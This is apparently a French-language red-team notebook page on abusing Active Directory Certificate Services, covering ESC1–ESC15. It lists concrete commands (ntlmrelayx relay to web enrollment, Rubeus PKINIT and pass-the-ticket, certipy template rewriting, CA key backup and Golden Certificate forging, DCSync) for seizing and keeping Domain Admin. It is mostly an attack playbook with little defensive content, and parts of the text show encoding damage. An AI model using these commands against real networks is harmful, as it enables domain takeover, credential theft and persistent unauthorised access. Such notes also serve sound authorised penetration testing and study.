<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>10-ADCS</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>10-ADCS</h1><br/><p> <em>objectif : dÃ©tourner lâ€™infra PKI pour obtenir des certificats, puis les utiliser en Pass-the-Certificate / Pass-the-Ticket afin dâ€™atteindre ou de conserver les droits Domain Admin.</em></p><p><ol><li>1. <h2>1. Enumeration ADCS</h2></li></ol></p><p></p><p></p><p></p><p><table class="table"><tr><th>But</th><th>Commandes clÃ©s</th><th>Ce que lâ€™on cherche</th></tr><tr><td>Lister les templates</td><td>certutil -v -template / certipy find -v / ldeep ldap â€¦ templates</td><td>Templates vulnÃ©rables (ESC1-3, 13, 15)</td></tr><tr><td>Lister les objets PKI</td><td>certipy exe pkiobjects</td><td>ACL faibles, object rights</td></tr><tr><td>Infos CA (nom, flags)</td><td>certutil -CAInfo / certipy exe cas</td><td>CA vulnÃ©rable (ESC6/11)</td></tr><tr><td>DÃ©tecter Web Enrollment</td><td>certutil -v -dstemplate ou simple GET sur /certsrv/</td><td>Portail disponible ?</td></tr></table></p><p><em>Indicateurs Ã  noter : portail </em><em><strong>Web Enrollment</strong></em><em> actif (ESC8), </em><em><strong>templates client-auth</strong></em><em> ou </em><em><code>ENROLLEE_SUPPLIES_SUBJECT</code></em><em> autorisÃ©s, </em><em><strong>EDITF_ATTRIBUTESUBJECTALTNAME2</strong></em><em> sur la CA, ACL </em><em><strong>GenericWrite</strong></em><em> sur template/PKI object.</em></p><p><ol><li>2. <h2>2. Exploit Web Enrollment (ESC8)</h2></li></ol></p><p><ul><li>elle permet de relay une authentification NTLM vers les points d&#39;enrollement de certificate bases sur HTTP pour obtenr un certificat au nom de la victime </li><li> if web enrollement interface is on<ul><li>http doesn&#39;t require signature so a CA can&#39;t know from where it got the connection from DC or attacker forwarded traffic </li><li>mitigation remove web enrollment interface or le <strong>EPA (Extended Protection for Authenticatio</strong></li></ul></li></ul></p><p>   <ol><li>Coerce (PetitPotam) =&gt; DC connects to Attacker.</li><li> Relay (ntlmrelayx)=&gt; Attacker forwards auth to CA (HTTP).</li><li>Enrol =&gt; CA issues Cert for DC.</li><li>PKINIT (Rubeus) =&gt;Exchange Cert for Kerberos TGT.</li><li>DCSync (Mimikatz) =&gt;Use TGT to dump Admin hashes. </li></ol></p><p></p><p></p><p>Exploit <ol><li><strong>Relai NTLM</strong> :</li></ol></p><p> <code>ntlmrelayx.py -t http://&lt;ca_ip&gt;/certsrv/certfnsh.asp --template DomainController</code></p><p><ol><li>RÃ©cupÃ©rer le <code>.cer</code> puis :</li></ol></p><p> <code>Rubeus.exe asktgt /user:&lt;user&gt; /certificate:base64cert</code></p><p><ol><li><strong>PTT</strong> : <code>Rubeus ptt /ticket:&lt;tgt&gt;</code></li></ol></p><p> â†’ <em>DCSYNC</em> ðŸŸ¦ â†’ <strong>Domain Admin</strong> ðŸ”´</p><p></p><p><ol><li>3. <h2>3. Templates mal configurÃ©s</h2></p><p></li></ol><table class="table"><tr><th>Template vuln.</th><th>Exploit (ex.)</th><th>RÃ©sultat</th></tr><tr><td>ESC1 (â€˜Enrollee supplies subjectâ€™)</td><td>certipy req -u &lt;user&gt;@&lt;dom&gt; -p &lt;pwd&gt; -template &lt;tpl&gt; -ca &lt;ca&gt;</td><td>Cert any UPN â†’ PTC (PKINIT)</td></tr><tr><td>ESC2 (ClientAuth + EKU mappÃ©e)</td><td>idem ESC1</td><td>PTC</td></tr><tr><td>ESC3 (No EKU / faible)</td><td>idem ESC1 puis Pass-the-Cert</td><td> </td></tr><tr><td>ESC13/15 (V 1 template + enrollee flag)</td><td>certipy req â€¦ -template &quot;version 1&quot;</td><td>PTC (Schannel)</td></tr></table></p><p><ol><li>4. <h2>4. Misconfigured ACL sur template (ESC4/ESC7)</h2></li><li><strong>GenericWrite</strong> sur un template â†’</li></ol></p><p><code>certipy template -u &lt;user&gt;@&lt;dom&gt; -p &lt;pwd&gt; \</code><code></code></p><p><code>        -template vuln_template --save-old --debug   # ESC4</code><code></code></p><p><code>certipy template -u &lt;user&gt;@&lt;dom&gt; -p &lt;pwd&gt; \</code><code></code></p><p><code>        -template vuln_template --configuration file.json  # restore modifiÃ©</code><code></code></p><p><code></code><ul><li>Puis <code>certipy req</code> â†’ <strong>Pass the Certificate</strong>.</li></ul></p><p></p><p></p><p><ol><li>5. <h2>5. Vulnerable PKI Object ACL (ESC5)</h2></li><li>Dump CA cert &amp; key :</li></ol></p><p> <code>certipy ca backup -u &lt;user&gt;@&lt;dom&gt; -hashes &lt;hash&gt; -ca &lt;ca&gt;</code></p><p><ul><li>Forger <em>Golden Certificate</em> : <code>certipy forge -ca .pfx -upn administrator@&lt;dom&gt;</code></li></ul></p><p><ul><li><strong>Pass the Cert</strong> â†’ DA.</li></ul></p><p></p><p></p><p><ol><li>6. <h2>6. Misconfigured CA flags (ESC6) &amp; relay (ESC11)</h2></li><li>Relai SMBâ†’RPC :</li></ol></p><p> <code>mitmrelay.py -t rpc://&lt;ca_ip&gt; --smb2support --rpc-mode ICert</code></p><p><ol><li><code>gettgtpkinit.py -pfx-base64 &lt;certb64&gt; &lt;domain&gt;/&lt;dc_name&gt;$</code></li></ol></p><p><ol><li>PTT â†’ <em>DCSYNC</em> â†’ <strong>Domain Admin</strong>.</li></ol></p><p></p><p><ol><li>7. <h2>7. Resource-Based / Cert Mapping (ESC9-10, 14)</h2></p><p></li></ol><table class="table"><tr><th>Cas</th><th>Ã‰tapes clefs</th><th>Effet</th></tr><tr><td>ESC9/ESC10 implicites</td><td>certipy shadow auto -username acctA -account acctB â†’ certipy req -username acctB$ â€¦ -template vuln</td><td>Compte B â–º PTC</td></tr><tr><td>ESC14 explicite</td><td>Reset UPN, demander cert, remettre UPN</td><td>PTC permanente</td></tr></table></p><p><ol><li>8. <h2>8. Livrables phase 10</h2></li><li><strong>Certificats PFX/KIRBI</strong> forgÃ©s pour admins &amp; DC.</li></ol></p><p><ul><li>Tickets TGT/TGS via PKINIT ou S4U (Pass-the-Certificate).</li></ul></p><p><ul><li>ContrÃ´le complet <strong>Domain Admin</strong> + persistance (Golden Cert, RBCD via ESC9/10).</li></ul></p><p><ul><li>Playbook clair : portail Web Enrollment (ESC8), templates (ESC1-3/13-15), ACL (ESC4-7), CA flags (ESC6/11), mappings (ESC9-10/14).</li></ul></p><p></p><p></p></div>
</body>
</html>
